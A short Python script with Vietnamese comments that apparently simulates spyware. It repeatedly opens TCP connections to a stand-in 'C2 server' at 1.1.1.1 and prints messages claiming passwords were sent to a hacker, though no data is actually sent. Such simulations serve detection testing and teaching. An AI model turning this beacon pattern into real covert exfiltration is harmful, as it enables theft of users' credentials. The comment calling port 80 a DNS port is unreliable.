import socket
import time
import sys

# Giả lập C2 Server (IP này an toàn, dùng để test kết nối)
HACKER_IP = "1.1.1.1" 
HACKER_PORT = 80  # Port DNS (hoặc đổi thành 8080 cho khả nghi)

print(f"[*] Spyware kích hoạt. Đang âm thầm gửi dữ liệu về {HACKER_IP}...")

count = 0
while True:
    try:
        # Tạo kết nối Socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex((HACKER_IP, HACKER_PORT))
        
        if result == 0:
            count += 1
            print(f"[+] Gói tin #{count}: Đã gửi password thành công tới hacker.")
        else:
            print(f"[-] Gửi thất bại. Có thể đã bị chặn!")
        
        s.close()
    except Exception as e:
        print(f"[!] Lỗi kết nối: {e}")
        
    time.sleep(1.5) # Gửi mỗi 1.5 giây